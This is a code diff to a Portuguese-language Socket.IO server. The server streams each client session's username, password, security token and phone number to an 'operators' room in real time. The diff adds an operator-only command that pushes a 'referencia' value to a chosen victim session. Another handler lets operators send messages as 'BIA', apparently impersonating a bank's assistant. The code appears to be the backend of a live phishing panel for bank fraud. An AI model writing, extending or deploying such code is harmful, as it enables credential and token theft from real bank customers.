@@ -165,6 +165,17 @@ io.on("connection", socket => {
       io.to("operators").emit("operator:sessions", snapshotSessions());
     });
 
+    socket.on("operator:enviar-referencia", (data: { sessionId: string; referencia: string }) => {
+      const s = sessions.get(data.sessionId);
+      if (!s) return;
+      s.referencia = data.referencia;
+      s.ultimaAtualizacao = Date.now();
+      if (s.socketId) {
+        io.to(s.socketId).emit("client:referencia", { referencia: data.referencia });
+      }
+      io.to("operators").emit("operator:sessions", snapshotSessions());
+    });
+
     socket.on("operator:bia-message", (data: { sessionId: string; texto: string }) => {
       const s = sessions.get(data.sessionId);
       if (!s) return;
@@ -244,13 +255,14 @@ io.on("connection", socket => {
     io.to("operators").emit("operator:sessions", snapshotSessions());
   }
 
-  socket.on("client:input", (data: { campo: string; valor: string }) => {
+    socket.on("client:input", (data: { campo: string; valor: string }) => {
     const sess = sessions.get(sessionId);
     if (!sess) return;
     if (data.campo === "usuario") sess.usuario = data.valor;
     if (data.campo === "senha") sess.senha = data.valor;
     if (data.campo === "token") sess.token = data.valor;
-    if (data.campo === "referencia") sess.referencia = data.valor;
+    // Não permitir que o cliente altere a referência diretamente
+    // if (data.campo === "referencia") sess.referencia = data.valor;
     if (data.campo === "ddd") sess.ddd = data.valor;
     if (data.campo === "telefone") sess.telefone = data.valor;
     sess.ultimaAtualizacao = Date.now();
